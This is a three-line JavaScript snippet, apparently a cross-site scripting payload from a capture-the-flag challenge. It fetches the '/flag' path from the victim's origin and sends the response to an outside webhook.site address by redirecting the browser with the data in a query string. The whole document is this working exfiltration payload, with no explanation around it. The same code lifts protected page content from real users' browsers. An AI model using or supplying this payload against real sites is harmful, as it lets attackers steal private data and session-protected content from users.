fetch('/flag')
  .then(response => response.text())
  .then(data => location='https://webhook.site/bd519bcb-0b5b-4c64-8c3a-6c75db7ec3f7/?q='+(data));